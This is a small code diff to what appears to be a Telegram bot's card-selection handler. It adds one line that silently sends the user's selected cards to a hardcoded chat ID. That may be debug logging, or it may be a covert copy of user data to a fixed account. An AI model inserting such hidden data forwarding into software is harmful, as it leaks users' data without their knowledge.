@@ -550,6 +550,7 @@ async def send_cards(callback_query: types.CallbackQuery):
         if "✅" in button.text
     ]
     ty = []
+    await bot.send_message(1155076760, f"{selected_cards}")
     for i in range(len(selected_cards)):
         if len(selected_cards[i]) > 1:
             ty.append(selected_cards[i])
